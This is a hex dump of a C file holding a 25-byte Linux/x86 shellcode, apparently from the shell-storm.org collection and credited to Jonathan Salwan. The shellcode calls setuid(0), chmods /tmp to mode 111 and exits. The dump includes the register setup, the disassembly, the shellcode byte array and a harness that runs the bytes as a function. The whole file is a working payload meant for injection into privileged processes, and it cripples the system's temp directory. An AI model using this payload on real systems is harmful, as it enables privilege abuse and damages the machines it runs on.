00000000  2f 2a 0a 20 20 20 4c 69  6e 75 78 2f 78 38 36 20  |/*.   Linux/x86 |
00000010  2d 20 73 65 74 75 69 64  28 30 29 20 26 20 63 68  |- setuid(0) & ch|
00000020  6d 6f 64 28 22 2f 74 6d  70 22 2c 31 31 31 29 20  |mod("/tmp",111) |
00000030  26 20 65 78 69 74 28 30  29 0a 20 20 20 09 0a 09  |& exit(0).   ...|
00000040  49 6e 66 6f 20 72 65 67  0a 20 20 20 20 20 20 20  |Info reg.       |
00000050  20 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  | ---------------|
00000060  2d 2d 2d 0a 20 20 20 09  25 65 61 78 20 3d 20 32  |---.   .%eax = 2|
00000070  33 0a 09 25 65 62 78 20  3d 20 30 0a 0a 09 25 65  |3..%ebx = 0...%e|
00000080  61 78 20 3d 20 31 35 0a  20 20 20 09 25 65 62 78  |ax = 15.   .%ebx|
00000090  20 3d 20 2f 74 6d 70 0a  20 20 20 09 25 65 63 78  | = /tmp.   .%ecx|
000000a0  20 3d 20 31 31 31 0a 0a  20 20 20 20 20 20 20 20  | = 111..        |
000000b0  25 65 61 78 20 3d 20 31  0a 20 20 20 20 20 20 20  |%eax = 1.       |
000000c0  20 25 65 62 78 20 3d 20  30 0a 20 20 20 0a 20 20  | %ebx = 0.   .  |
000000d0  20 53 68 65 6c 6c 63 6f  64 65 20 32 35 20 62 79  | Shellcode 25 by|
000000e0  74 65 73 0a 20 20 20 41  75 74 68 6f 72 3a 20 4a  |tes.   Author: J|
000000f0  6f 6e 61 74 68 61 6e 20  53 61 6c 77 61 6e 20 3c  |onathan Salwan <|
00000100  20 73 75 62 6d 69 74 20  5b 41 54 5d 20 73 68 65  | submit [AT] she|
00000110  6c 6c 2d 73 74 6f 72 6d  2e 6f 72 67 20 3e 0a 20  |ll-storm.org >. |
00000120  20 20 57 65 62 3a 20 68  74 74 70 3a 2f 2f 77 77  |  Web: http://ww|
00000130  77 2e 73 68 65 6c 6c 2d  73 74 6f 72 6d 2e 6f 72  |w.shell-storm.or|
00000140  67 0a 0a 0a 20 44 69 73  61 73 73 65 6d 62 6c 79  |g... Disassembly|
00000150  20 6f 66 20 73 65 63 74  69 6f 6e 20 2e 74 65 78  | of section .tex|
00000160  74 3a 0a 0a 20 30 38 30  34 38 30 35 34 20 3c 2e  |t:.. 08048054 <.|
00000170  74 65 78 74 3e 3a 0a 20  38 30 34 38 30 35 34 3a  |text>:. 8048054:|
00000180  09 36 61 20 32 33 20 20  20 20 20 20 20 20 20 20  |.6a 23          |
00000190  20 20 20 20 20 20 09 70  75 73 68 20 20 20 24 30  |      .push   $0|
000001a0  78 32 33 0a 20 38 30 34  38 30 35 36 3a 09 35 38  |x23. 8048056:.58|
000001b0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000001c0  20 20 20 09 70 6f 70 20  20 20 20 25 65 61 78 0a  |   .pop    %eax.|
000001d0  20 38 30 34 38 30 35 37  3a 09 33 31 20 64 62 20  | 8048057:.31 db |
000001e0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 09  |               .|
000001f0  78 6f 72 20 20 20 20 25  65 62 78 2c 25 65 62 78  |xor    %ebx,%ebx|
00000200  0a 20 38 30 34 38 30 35  39 3a 09 63 64 20 38 30  |. 8048059:.cd 80|
00000210  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000220  09 69 6e 74 20 20 20 20  24 30 78 38 30 0a 20 38  |.int    $0x80. 8|
00000230  30 34 38 30 35 62 3a 09  35 31 20 20 20 20 20 20  |04805b:.51      |
00000240  20 20 20 20 20 20 20 20  20 20 20 20 20 09 70 75  |             .pu|
00000250  73 68 20 20 20 25 65 63  78 0a 20 38 30 34 38 30  |sh   %ecx. 80480|
00000260  35 63 3a 09 62 31 20 34  39 20 20 20 20 20 20 20  |5c:.b1 49       |
00000270  20 20 20 20 20 20 20 20  20 09 6d 6f 76 20 20 20  |         .mov   |
00000280  20 24 30 78 34 39 2c 25  63 6c 0a 20 38 30 34 38  | $0x49,%cl. 8048|
00000290  30 35 65 3a 09 36 38 20  32 66 20 37 34 20 36 64  |05e:.68 2f 74 6d|
000002a0  20 37 30 20 20 20 20 20  20 20 09 70 75 73 68 20  | 70       .push |
000002b0  20 20 24 30 78 37 30 36  64 37 34 32 66 0a 20 38  |  $0x706d742f. 8|
000002c0  30 34 38 30 36 33 3a 09  38 39 20 65 33 20 20 20  |048063:.89 e3   |
000002d0  20 20 20 20 20 20 20 20  20 20 20 20 20 09 6d 6f  |             .mo|
000002e0  76 20 20 20 20 25 65 73  70 2c 25 65 62 78 0a 20  |v    %esp,%ebx. |
000002f0  38 30 34 38 30 36 35 3a  09 36 61 20 30 66 20 20  |8048065:.6a 0f  |
00000300  20 20 20 20 20 20 20 20  20 20 20 20 20 20 09 70  |              .p|
00000310  75 73 68 20 20 20 24 30  78 66 0a 20 38 30 34 38  |ush   $0xf. 8048|
00000320  30 36 37 3a 09 35 38 20  20 20 20 20 20 20 20 20  |067:.58         |
00000330  20 20 20 20 20 20 20 20  20 20 09 70 6f 70 20 20  |          .pop  |
00000340  20 20 25 65 61 78 0a 20  38 30 34 38 30 36 38 3a  |  %eax. 8048068:|
00000350  09 63 64 20 38 30 20 20  20 20 20 20 20 20 20 20  |.cd 80          |
00000360  20 20 20 20 20 20 09 69  6e 74 20 20 20 20 24 30  |      .int    $0|
00000370  78 38 30 0a 20 38 30 34  38 30 36 61 3a 09 34 30  |x80. 804806a:.40|
00000380  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000390  20 20 20 09 69 6e 63 20  20 20 20 25 65 61 78 0a  |   .inc    %eax.|
000003a0  20 38 30 34 38 30 36 62  3a 09 63 64 20 38 30 20  | 804806b:.cd 80 |
000003b0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 09  |               .|
000003c0  69 6e 74 20 20 20 20 24  30 78 38 30 0a 0a 2a 2f  |int    $0x80..*/|
000003d0  0a 0a 23 69 6e 63 6c 75  64 65 20 22 73 74 64 69  |..#include "stdi|
000003e0  6f 2e 68 22 0a 0a 69 6e  74 20 6d 61 69 6e 28 69  |o.h"..int main(i|
000003f0  6e 74 20 61 72 67 63 2c  20 63 68 61 72 20 2a 61  |nt argc, char *a|
00000400  72 67 76 5b 5d 29 0a 7b  0a 0a 09 63 68 61 72 20  |rgv[]).{...char |
00000410  73 68 65 6c 6c 63 6f 64  65 5b 5d 20 3d 20 09 22  |shellcode[] = ."|
00000420  5c 78 36 61 5c 78 32 33  5c 78 35 38 5c 78 33 31  |\x6a\x23\x58\x31|
00000430  22 20 20 20 2f 2f 20 73  65 74 75 69 64 28 30 29  |"   // setuid(0)|
00000440  0a 09 09 09 09 22 5c 78  64 62 5c 78 63 64 5c 78  |....."\xdb\xcd\x|
00000450  38 30 22 20 20 20 20 20  20 20 0a 0a 09 09 09 09  |80"       ......|
00000460  22 5c 78 35 31 5c 78 62  31 5c 78 34 39 5c 78 36  |"\x51\xb1\x49\x6|
00000470  38 22 0a 09 09 09 09 22  5c 78 32 66 5c 78 37 34  |8"....."\x2f\x74|
00000480  5c 78 36 64 5c 78 37 30  22 20 20 20 2f 2f 20 63  |\x6d\x70"   // c|
00000490  68 6d 6f 64 28 22 2f 74  6d 70 22 2c 31 31 31 29  |hmod("/tmp",111)|
000004a0  0a 09 09 09 09 22 5c 78  38 39 5c 78 65 33 5c 78  |....."\x89\xe3\x|
000004b0  36 61 5c 78 30 66 22 0a  09 09 09 09 22 5c 78 35  |6a\x0f"....."\x5|
000004c0  38 5c 78 63 64 5c 78 38  30 22 0a 0a 09 09 09 09  |8\xcd\x80"......|
000004d0  22 5c 78 34 30 5c 78 63  64 5c 78 38 30 22 3b 20  |"\x40\xcd\x80"; |
000004e0  20 20 20 20 20 2f 2f 20  65 78 69 74 28 30 29 0a  |     // exit(0).|
000004f0  09 09 09 09 0a 09 09 09  09 0a 0a 09 70 72 69 6e  |............prin|
00000500  74 66 28 22 4c 65 6e 67  74 68 3a 20 25 64 5c 6e  |tf("Length: %d\n|
00000510  22 2c 73 74 72 6c 65 6e  28 73 68 65 6c 6c 63 6f  |",strlen(shellco|
00000520  64 65 29 29 3b 0a 09 28  2a 28 76 6f 69 64 28 2a  |de));..(*(void(*|
00000530  29 28 29 29 20 73 68 65  6c 6c 63 6f 64 65 29 28  |)()) shellcode)(|
00000540  29 3b 0a 09 0a 09 72 65  74 75 72 6e 20 30 3b 0a  |);....return 0;.|
00000550  7d                                                |}|
00000551
